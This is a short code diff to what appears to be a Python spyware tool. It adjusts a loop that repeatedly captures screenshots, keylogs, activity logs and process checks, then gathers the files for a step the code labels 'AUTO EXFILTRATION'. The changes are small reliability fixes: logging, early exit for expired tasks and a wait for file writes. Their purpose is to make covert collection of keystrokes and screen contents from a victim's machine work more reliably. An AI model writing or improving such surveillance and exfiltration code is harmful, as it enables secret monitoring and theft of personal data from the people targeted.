@@ -734,21 +734,30 @@ async def run_persistent_task(task_manager: PersistentTaskManager, task: Persist
             result_path = await action_handler(task, iteration)
             if result_path and result_path not in collected_files:
                 collected_files.append(result_path)
+                print(f"[COLLECTED] File {iteration}: {result_path}")
             
             # Update task data path
             if result_path:
                 task.data_path = result_path
                 task_manager._save_tasks()
             
+            # For single-iteration tasks (screenshot with short duration), exit immediately
+            # This ensures we don't wait unnecessarily
+            if task.is_expired():
+                break
+                
             # Calculate remaining time
             remaining = task.time_remaining()
             sleep_time = min(task.interval_seconds, remaining)
             
-            if sleep_time > 0:
+            if sleep_time > 0 and not task.is_expired():
                 await asyncio.sleep(sleep_time)
         
         # === TASK COMPLETED - AUTO EXFILTRATION ===
         print(f"[LOOP END] {task.task_name} completed after {iteration} iterations")
+        
+        # Give filesystem time to finish writing files
+        await asyncio.sleep(2)
         
         # Collect all files for this task
         task_files = []
@@ -756,6 +765,7 @@ async def run_persistent_task(task_manager: PersistentTaskManager, task: Persist
         # For screenshots, collect all files matching the task ID
         if task.action_type == 'screenshot':
             task_files = list(SCREENSHOTS_DIR.glob(f"screenshot_{task.task_id[:8]}_*.png"))
+            print(f"[COLLECTION] Found {len(task_files)} screenshot files")
         elif task.action_type in ['keylog', 'activity']:
             task_files = list(KEYLOGS_DIR.glob(f"activity_log_{task.task_id[:8]}.txt"))
         elif task.action_type == 'process_check':
